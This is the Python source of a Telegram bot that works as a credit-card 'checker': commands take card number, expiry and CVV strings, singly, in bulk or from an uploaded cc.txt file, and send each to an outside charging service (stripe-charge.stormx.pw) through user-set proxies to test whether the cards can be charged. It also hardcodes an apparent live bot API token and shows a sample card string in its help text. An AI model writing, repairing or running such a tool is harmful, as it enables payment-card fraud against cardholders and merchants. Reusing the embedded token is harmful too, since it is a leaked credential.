# stripe_fixed.py
import aiohttp
import asyncio
import json
import logging
import os
import urllib.parse
from aiogram import Bot, Dispatcher, types
from aiogram.types import FSInputFile
from aiogram.filters import Command

# ---- Config ----
API_TOKEN = "8288978939:AAG9tFDU59Ks_Zw9F3drg05ml0jZMOkurnU"
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# ---- Persistent proxy storage ----
PROXY_FILE = "proxies.json"
# in-memory cache (chat_id (str) -> proxy string)
chat_proxies = {}
_proxies_lock = asyncio.Lock()

def _load_proxies_from_file():
    """Load proxies from PROXY_FILE into chat_proxies (safely)."""
    global chat_proxies
    if not os.path.exists(PROXY_FILE):
        chat_proxies = {}
        return
    try:
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            # ensure keys are strings for JSON compatibility
            chat_proxies = {str(k): v for k, v in (data or {}).items()}
    except Exception:
        chat_proxies = {}

def _save_proxies_to_file():
    """Save current chat_proxies to PROXY_FILE (synchronously)."""
    try:
        with open(PROXY_FILE, "w", encoding="utf-8") as f:
            json.dump(chat_proxies, f, ensure_ascii=False, indent=2)
    except Exception:
        # fail silently; we don't want to crash bot on disk error
        pass

# Load on startup
_load_proxies_from_file()

# ---- API Request ----
async def check_cc(cc, proxy=None):
    """Uses the new Stripe-charge API (stripe-charge.stormx.pw).
       proxy (optional) should be a string like 'ip:port' or 'user:pass@ip:port'.
    """
    proxy_param = urllib.parse.quote_plus(proxy) if proxy else ""
    # encode cc to be safe in URL
    cc_param = urllib.parse.quote_plus(cc)
    url = f"https://stripe-charge.stormx.pw/index.cpp?key=dark&cc={cc_param}&amount=10&proxy={proxy_param}"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=30) as resp:
                text = await resp.text()
                # handle common CSRF/site inaccessible message
                if "Failed to get CSRF token" in text or "CSRF" in text:
                    return f"CC: {cc}\n📡 Response: ❌ Failed to get CSRF token — site not accessible or proxy missing/incorrect."

                # try parse as JSON
                try:
                    data = json.loads(text)
                except Exception:
                    snippet = text.strip()
                    if len(snippet) > 1500:
                        snippet = snippet[:1500] + "..."
                    return f"CC: {cc}\n📡 Response (non-JSON): {snippet}"

                # if parsed JSON
                if isinstance(data, dict):
                    resp_field = data.get('response') or data.get('status') or data.get('message')
                    resp_text = str(resp_field) if resp_field else json.dumps(data)
                    if len(resp_text) > 1500:
                        resp_text = resp_text[:1500] + '...'
                    return f"CC: {data.get('cc', cc)}\n📡 Response: {resp_text}"

                return f"CC: {cc}\n📡 Response: {str(data)}"

    except asyncio.TimeoutError:
        return f"CC: {cc}\n📡 Response: ❌ Timeout while contacting API."
    except Exception as e:
        return f"CC: {cc}\n📡 Response: Exception → {str(e)}"


# ---- Helper: proxy get/set ----
async def set_chat_proxy(chat_id, proxy_value):
    """Set proxy for a chat and persist to file."""
    async with _proxies_lock:
        chat_proxies[str(chat_id)] = proxy_value
        _save_proxies_to_file()

async def get_chat_proxy(chat_id):
    return chat_proxies.get(str(chat_id))

async def clear_chat_proxy(chat_id):
    async with _proxies_lock:
        if str(chat_id) in chat_proxies:
            del chat_proxies[str(chat_id)]
            _save_proxies_to_file()
            return True
    return False

# ---- Commands ----
@dp.message(Command("cmds"))
async def cmds(message: types.Message):
    cmds_list = """
📌 Available Commands:
/cmds - Show all commands
/chk <cc> [proxy] - Check single CC. Optional proxy override for this check.
/mchk <ccs> - Check multiple CCs (line separated). Uses set proxy if available.
/chktxt - Reply to a cc.txt file and run checks (uses set proxy if available)

/setproxy <proxy> - Set default proxy for this chat (applies to /mchk and /chktxt)
/getproxy - Show current proxy for this chat
/clearproxy - Clear stored proxy for this chat
/exportproxies - (owner/admin) export proxies.json file

Examples:
/chk 5294340552978656|09|27|902 1.2.3.4:8080
/setproxy user:pass@1.2.3.4:8000
"""
    await message.answer(cmds_list)


@dp.message(Command("setproxy"))
async def setproxy(message: types.Message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("⚠️ Usage: /setproxy <proxy>\nExample: /setproxy 1.2.3.4:8000 or /setproxy user:pass@1.2.3.4:8000")
        return
    proxy = parts[1].strip()
    await set_chat_proxy(message.chat.id, proxy)
    await message.answer(f"✅ Proxy set for this chat: `{proxy}`", parse_mode="Markdown")


@dp.message(Command("getproxy"))
async def getproxy(message: types.Message):
    proxy = await get_chat_proxy(message.chat.id)
    if proxy:
        await message.answer(f"🔎 Current proxy for this chat: `{proxy}`", parse_mode="Markdown")
    else:
        await message.answer("🔎 No proxy set for this chat. Use /setproxy to set one.")


@dp.message(Command("clearproxy"))
async def clearproxy(message: types.Message):
    ok = await clear_chat_proxy(message.chat.id)
    if ok:
        await message.answer("🧹 Proxy cleared for this chat.")
    else:
        await message.answer("⚠️ No proxy was set for this chat.")


@dp.message(Command("exportproxies"))
async def exportproxies(message: types.Message):
    # Restricting: only chat owner or admins should export in groups.
    # For simplicity, we allow export in private chat with bot owner.
    if message.chat.type != "private":
        await message.answer("⚠️ Export allowed only in private chat with the bot owner/admin.")
        return
    if not os.path.exists(PROXY_FILE):
        await message.answer("ℹ️ No proxies to export.")
        return
    await message.answer_document(FSInputFile(PROXY_FILE))


@dp.message(Command("chk"))
async def chk(message: types.Message):
    # /chk <cc> [proxy]
    parts = message.text.split(maxsplit=2)
    if len(parts) < 2:
        await message.answer("⚠️ Usage: /chk <cc> [proxy]")
        return

    cc = parts[1].strip()
    # allow optional proxy override in same command
    proxy = None
    if len(parts) == 3:
        proxy = parts[2].strip()
    else:
        proxy = await get_chat_proxy(message.chat.id)

    msg = await message.answer("⏳ CHECKING...")
    result = await check_cc(cc, proxy=proxy)
    await msg.edit_text(result)


@dp.message(Command("mchk"))
async def mchk(message: types.Message):
    # /mchk <ccs>  (line separated)
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("⚠️ Usage: /mchk <ccs>  — paste multiple lines where each line is card|mm|yy|cvv")
        return

    ccs = parts[1].splitlines()
    results = []
    msg = await message.answer("⏳ Checking multiple CCs...")

    proxy = await get_chat_proxy(message.chat.id)

    for cc in ccs:
        cc = cc.strip()
        if not cc:
            continue
        res = await check_cc(cc, proxy=proxy)
        results.append(res)
        # show incremental progress (last 5)
        await msg.edit_text("\n\n".join(results[-5:]))

    with open("result.txt", "w", encoding="utf-8") as f:
        f.write("\n\n".join(results))

    await message.answer_document(FSInputFile("result.txt"))


@dp.message(Command("chktxt"))
async def chktxt(message: types.Message):
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.answer("⚠️ Reply to a cc.txt file with /chktxt")
        return

    file = await bot.get_file(message.reply_to_message.document.file_id)
    cc_file = "cc.txt"
    await bot.download_file(file.file_path, cc_file)

    with open(cc_file, "r", encoding="utf-8") as f:
        ccs = f.read().splitlines()

    results = []
    msg = await message.answer("⏳ Checking cc.txt...")

    proxy = await get_chat_proxy(message.chat.id)

    for cc in ccs:
        cc = cc.strip()
        if not cc:
            continue
        res = await check_cc(cc, proxy=proxy)
        results.append(res)
        await msg.edit_text("\n\n".join(results[-5:]))

    with open("result.txt", "w", encoding="utf-8") as f:
        f.write("\n\n".join(results))

    await message.answer_document(FSInputFile("result.txt"))


# ---- Start ----
@dp.message(Command("start"))
async def start(message: types.Message):
    await message.answer("👋 Welcome! Use /cmds to see commands. You can set a proxy for this chat with /setproxy <proxy>.")

async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
